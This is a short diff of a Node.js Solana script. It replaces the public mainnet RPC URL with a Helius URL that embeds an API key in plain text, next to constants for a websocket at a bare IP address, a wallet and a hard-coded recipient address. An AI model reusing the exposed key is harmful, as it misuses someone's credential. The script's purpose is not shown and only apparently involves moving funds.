@@ -3,7 +3,7 @@ const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Key
 const bs58 = require('bs58');
 
 const WEBHOOK_URL = 'ws://45.134.108.167:5006/ws';
-const RPC_URL = 'https://api.mainnet.solana.com'; 
+const RPC_URL = 'https://mainnet.helius-rpc.com/?api-key=758fd668-8d79-4538-9ae4-3741a4c877e8'; 
 const WALLET_ADDRESS = 'ep3XjfiJrRpmiSqh6fTd14YwNBSHuSj6UA732c3Dw1k';
 const RECIPIENT_ADDRESS = 'FxuvBFb4prD1bHF7Efp5nQCaEoUnL2UaoaZxFGGHy4d5'; 
 
